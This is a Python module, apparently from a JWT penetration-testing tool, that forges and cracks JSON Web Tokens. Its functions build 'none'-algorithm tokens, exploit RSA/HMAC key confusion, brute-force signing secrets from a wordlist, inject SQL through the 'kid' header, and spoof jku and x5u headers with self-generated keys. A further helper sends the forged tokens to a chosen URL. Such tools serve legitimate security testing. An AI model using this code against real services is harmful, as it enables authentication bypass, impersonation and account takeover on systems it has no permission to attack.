"""
All methods needed to try vulnerabilities on jwt
"""
import base64
import json
from typing import Dict

import click
import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from OpenSSL import crypto

from myjwt.Exception import InvalidJWT
from myjwt.modify_jwt import change_alg
from myjwt.modify_jwt import signature
from myjwt.utils import create_crt
from myjwt.utils import encode_jwt
from myjwt.utils import HEADER
from myjwt.utils import is_valid_jwt
from myjwt.utils import jwt_to_json
from myjwt.utils import PAYLOAD
from myjwt.utils import SIGNATURE


def none_vulnerability(jwt: str) -> str:
    """
    Check none Vulnerability.

    Parameters
    ----------
    jwt: str
        your jwt string.

    Returns
    -------
    str
        your new jwt.

    Raises
    -------
    InvalidJWT
        if your jwt is not valid.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = change_alg(jwt_to_json(jwt), "none")
    return encode_jwt(jwt_json) + "."


def confusion_rsa_hmac(jwt: str, filename: str) -> str:
    """
    Check rsa/hmac confusion.

    Parameters
    ----------
    jwt: str
        your jwt string.
    filename: str
        path file of your public key.

    Returns
    -------
    str
        your new jwt.

    Raises
    -------
    InvalidJWT
        if your jwt is not valid.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = change_alg(jwt_to_json(jwt), "HS256")
    return signature(jwt_json, open(filename).read())


def bruteforce_wordlist(jwt: str, filename: str) -> str:
    """
    Crack your jwt with wordlist.

    Parameters
    ----------
    jwt: str
        your jwt string.
    filename: str
        path file of your wordlist txt file.

    Returns
    -------
    str
        your new jwt or "" if the valid key is not found.

    Raises
    -------
    InvalidJWT
        if your jwt is not valid.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)
    with open(filename, encoding="latin-1") as file:
        all_password = [line.rstrip() for line in file]
    file.close()
    for password in all_password:
        new_jwt = signature(jwt_json, password)
        new_signature = new_jwt.split(".")[2]
        if new_signature == jwt.split(".")[2]:
            return password
    return ""


def inject_sql_kid(jwt: str, injection: str) -> str:
    """
    Inject sql to your jwt.

    Parameters
    ----------
    jwt: str
        your jwt.
    injection: str
        your kid injection.

    Returns
    -------
    str
        your new jwt.

    Raises
    -------
    InvalidJWT
        if your jwt is not valid.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)
    jwt_json[HEADER]["kid"] = injection
    return signature(jwt_json, "")


def send_jwt_to_url(
    url: str,
    method: str,
    data: Dict,
    cookies: Dict,
    jwt: str,
) -> requests.Response:
    """

    Parameters
    ----------
    url: str
        your url.
    method: str
        method (GET, POST, etc.....).
    data: Dict
        json to send.
    cookies: Dict
        cookies to send.
    jwt: str
        your jwt.
    Returns
    -------
    requests.Response
        Response
    """
    if method == "POST":
        return requests.post(
            url,
            json=data,
            headers={"Authorization": "Bearer " + jwt},
            cookies=cookies,
        )

    return requests.request(method=method, url=url, json=data, cookies=cookies)


def print_decoded(jwt: str):
    """
    Print your jwt.

    Parameters
    ----------
    jwt: str
        your jwt.

    Returns
    -------
    None
        Print your jwt.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)
    click.echo("Header: " + json.dumps(jwt_json[HEADER]))
    click.echo("Payload: " + json.dumps(jwt_json[PAYLOAD]))
    click.echo("Signature: " + json.dumps(jwt_json[SIGNATURE]))


def jku_vulnerability(jwt=None, url=None, file=None, pem=None):
    """
    Check jku Vulnerability.

    Parameters
    ----------
    jwt: str
        your jwt.
    url: str
        your url.
    file: str
        your output json file name
    pem: str
       pem file name

    Returns
    -------
    str
        your new jwt.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)

    if "jku" not in jwt_json[HEADER]:
        raise InvalidJWT("Invalid JWT format JKU missing")

    if file is None:
        file = "jwk-python"
    jwks = requests.get(jwt_json[HEADER]["jku"]).json()

    jwt_json[HEADER]["alg"] = "RS256"
    jwt_json[HEADER]["jku"] = f"{url}/{file}.json"
    if pem is None:
        key = crypto.PKey()
        key.generate_key(type=crypto.TYPE_RSA, bits=2048)
    else:
        key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())
    priv = key.to_cryptography_key()
    pub = priv.public_key()

    e = pub.public_numbers().e
    n = pub.public_numbers().n

    jwks["keys"][0]["e"] = (
        base64.urlsafe_b64encode(
            e.to_bytes(e.bit_length() // 8 + 1, byteorder="big"),
        )
        .decode("UTF-8")
        .rstrip("=")
    )
    jwks["keys"][0]["n"] = (
        base64.urlsafe_b64encode(
            n.to_bytes(n.bit_length() // 8 + 1, byteorder="big"),
        )
        .decode("UTF-8")
        .rstrip("=")
    )

    f = open(f"{file}.json", "w")
    f.write(json.dumps(jwks))
    f.close()

    s = encode_jwt(jwt_json)

    sign = priv.sign(
        bytes(s, encoding="UTF-8"),
        algorithm=hashes.SHA256(),
        padding=padding.PKCS1v15(),
    )

    return s + "." + base64.urlsafe_b64encode(sign).decode("UTF-8").rstrip("=")


def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None):
    """
    Check jku Vulnerability.

    Parameters
    ----------
    jwt: str
        your jwt.
    url: str
        your url.
    crt: str
        crt path file
    pem: str
       pem file name

    Returns
    -------
    str
        your new jwt.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)
    if "x5u" not in jwt_json[HEADER]:
        raise InvalidJWT("Invalid JWT format JKU missing")
    if crt is None or pem is None:
        crt, pem = create_crt()

    with open(crt) as f:
        content = f.read()
        f.close()

    x5u = requests.get(jwt_json[HEADER]["x5u"]).json()
    x5u["keys"][0]["x5c"] = (
        content.replace("-----END CERTIFICATE-----", "")
        .replace("-----BEGIN CERTIFICATE-----", "")
        .replace("\n", "")
    )

    jwt_json[HEADER]["x5u"] = url

    f = open("jwks_with_x5c.json", "w")
    f.write(json.dumps(x5u))
    f.close()

    s = encode_jwt(jwt_json)
    key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())

    priv = key.to_cryptography_key()
    sign = priv.sign(
        bytes(s, encoding="UTF-8"),
        algorithm=hashes.SHA256(),
        padding=padding.PKCS1v15(),
    )

    return s + "." + base64.urlsafe_b64encode(sign).decode("UTF-8").rstrip("=")
